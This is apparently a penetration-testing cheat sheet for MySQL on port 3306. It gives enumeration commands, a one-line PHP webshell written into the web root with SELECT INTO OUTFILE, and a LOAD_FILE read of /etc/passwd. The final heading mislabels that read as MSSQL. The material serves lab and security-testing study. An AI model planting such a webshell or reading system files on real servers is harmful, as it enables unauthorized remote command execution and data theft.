# 3306 - Mysql

## Enumeration

| Command                                                  | Description                |
| -------------------------------------------------------- | -------------------------- |
| `mysql -u <user> -p<password> -h <FQDN/IP>`              | Login to the MySQL server. |
| `sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*` | Nmap MySQL enumeration     |

| `mysql> SHOW DATABASES;`      | Show all available databases in MySQL.                        |
| ----------------------------- | ------------------------------------------------------------- |
| `mysql> USE htbusers;`        | Select a specific database in MySQL.                          |
| `mysql> SHOW TABLES;`         | Show all available tables in the selected database in MySQL.  |
| `mysql> SELECT * FROM users;` | Select all available entries from the “users” table in MySQL. |

## Create PHP webshell using MySQL&#x20;

```
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'
```

## Check if the the secure file privileges are empty to read locally stored files on the system.

```
show variables like "secure_file_priv";
```

## Read local files in MSSQL

```
select LOAD_FILE("/etc/passwd");
```
